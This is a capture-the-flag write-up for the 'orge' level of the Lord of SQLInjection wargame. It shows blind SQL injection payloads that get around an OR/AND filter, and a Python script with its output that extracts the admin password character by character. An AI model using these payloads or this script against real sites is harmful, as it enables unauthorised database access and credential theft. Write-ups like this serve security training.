---
custom_edit_url: null
sidebar_position: 7
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/b4a2f5ed-77f8-4b4a-aaae-220bf30b6964)

We are provided with the SQL query:

```sql
SELECT id FROM prob_orge WHERE id='guest' AND pw='{$_GET[pw]}'
```

The code performs two conditional checks:

1. `if($result['id'])`: It checks if the statement is `True`. If yes, it prints the message `Hello {$result[id]}`
2. `if(($result['pw']) && ($result['pw'] == $_GET['pw']))`: It then checks if the `pw` that is provided is correct. If yes, it prints the flag.


It is similar to [orc](https://writeups-kunull.vercel.app/Lord%20of%20SQLInjection/orc) but this level also blocks the `OR` and `AND` characters. So we will have to use their alternatives `||` and `&&` respectively.

In order to print out the flag, we need to first know the password. We have to perform a Blind SQL Injection.

## Blind SQL Injection

First we have to reveal the length of the flag.

### Retrieving the password length

If provide the following URI parameter:

```
?pw=' || id='admin' %26%26 length(pw)=[length] -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && length(pw)=[lenght] -- -'
```

When the length of `pw` for `id='admin'` is equal to the `[length]` that we provide, the query will result into `True`. 
This will cause the `Hello admin` message to be printed. 
We can brute force the length and use the message as an indicator of correct brute force value.

### Leaking the password

Next, we can leak the password byte by byte using the `substr()` function.

#### `substr()`

![Pasted image 20240610125927](https://github.com/Kunull/Write-ups/assets/110326359/1f746f94-b19a-4867-8868-f8396aa3e375)

If we provide the following URI parameter:

```
?pw=' || id='admin' %26%26 substr(pw, [index], 1)='[character]' -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && substr(pw, [index], 1)='[character]' -- -'
```

If for `id='admin'`, the character of the `pw` at `[index]` is the same as the `[character]` that we provide, the query will result into `True`. 
This will cause the `Hello admin` message to be printed. 
We can brute force the password by changing the `[index]` and the `[character]`.

```
7b751aec
```

### Script

We can automate the entire process using a script.

```py title="orge_script.py"
import requests
import urllib.parse
import string

cookies = {'PHPSESSID': 'jkvees84mr4jq3nallg9rum7he'}
url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
password_length = 0

for x in range(0, 10):
  payload = f"' || id='admin' && length(pw)={x} -- -"
  encoded_payload = urllib.parse.quote_plus(payload)
  full_url = f"{url}?pw={encoded_payload}"
    
  response = requests.get(full_url, cookies=cookies)
    
  if "Hello admin" in response.text:
    password_length = x
    break

print()    
print(f"[!] Payload: ?pw={payload}")
print(f"[!] Payload (URL encoded): ?pw={encoded_payload}")
print(f"[!] Password length: {password_length}")

password = ""
searchspace = string.digits + string.ascii_letters

for index in range(1, password_length + 1):
  for char in searchspace:
    payload = f"' || id='admin' && substr(pw, {index}, 1)='{char}' -- -"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f"{url}?pw={encoded_payload}"

    response = requests.get(full_url, cookies=cookies)

    if "Hello admin" in response.text:
      password += char
      print()
      print(f"[+] Payload: ?pw={payload}")
      print(f"[+] Payload (URL encoded): ?pw={encoded_payload}")
      print(f"[+] Character at index {index}: {char}")
      break

print()
print(f"[!] Extracted password: {password}")
print(f"[!] Final payload: ?pw={password}")
```

```
$ python .\orge_script.py

[!] Payload: ?pw=' || id='admin' && length(pw)=8 -- -
[!] Payload (URL encoded): ?pw=%27+%7C%7C+id%3D%27admin%27+%26%26+length%28pw%29%3D8+--+-
[!] Password length: 8

[+] Payload: ?pw=' || id='admin' && substr(pw, 1, 1)='7' -- -
[+] Payload (URL encoded): ?pw=%27+%7C%7C+id%3D%27admin%27+%26%26+substr%28pw%2C+1%2C+1%29%3D%277%27+--+-
[+] Character at index 1: 7

[+] Payload: ?pw=' || id='admin' && substr(pw, 2, 1)='b' -- -
[+] Payload (URL encoded): ?pw=%27+%7C%7C+id%3D%27admin%27+%26%26+substr%28pw%2C+2%2C+1%29%3D%27b%27+--+-
[+] Character at index 2: b

[+] Payload: ?pw=' || id='admin' && substr(pw, 3, 1)='7' -- -
[+] Payload (URL encoded): ?pw=%27+%7C%7C+id%3D%27admin%27+%26%26+substr%28pw%2C+3%2C+1%29%3D%277%27+--+-
[+] Character at index 3: 7

[+] Payload: ?pw=' || id='admin' && substr(pw, 4, 1)='5' -- -
[+] Payload (URL encoded): ?pw=%27+%7C%7C+id%3D%27admin%27+%26%26+substr%28pw%2C+4%2C+1%29%3D%275%27+--+-
[+] Character at index 4: 5

[+] Payload: ?pw=' || id='admin' && substr(pw, 5, 1)='1' -- -
[+] Payload (URL encoded): ?pw=%27+%7C%7C+id%3D%27admin%27+%26%26+substr%28pw%2C+5%2C+1%29%3D%271%27+--+-
[+] Character at index 5: 1

[+] Payload: ?pw=' || id='admin' && substr(pw, 6, 1)='a' -- -
[+] Payload (URL encoded): ?pw=%27+%7C%7C+id%3D%27admin%27+%26%26+substr%28pw%2C+6%2C+1%29%3D%27a%27+--+-
[+] Character at index 6: a

[+] Payload: ?pw=' || id='admin' && substr(pw, 7, 1)='e' -- -
[+] Payload (URL encoded): ?pw=%27+%7C%7C+id%3D%27admin%27+%26%26+substr%28pw%2C+7%2C+1%29%3D%27e%27+--+-
[+] Character at index 7: e

[+] Payload: ?pw=' || id='admin' && substr(pw, 8, 1)='c' -- -
[+] Payload (URL encoded): ?pw=%27+%7C%7C+id%3D%27admin%27+%26%26+substr%28pw%2C+8%2C+1%29%3D%27c%27+--+-
[+] Character at index 8: c

[!] Extracted password: 7b751aec
[!] Final payload: ?pw=7b751aec
```

Now, we can provide password URI parameter:

```
?pw=7b751aec
```

The resultant query becomes:

```sql
SELECT id FROM prob_orge WHERE id='admin' AND pw='7b751aec'
```

![7](https://github.com/Kunull/Write-ups/assets/110326359/601ce708-c7b6-4486-be1d-faad595f9c14)
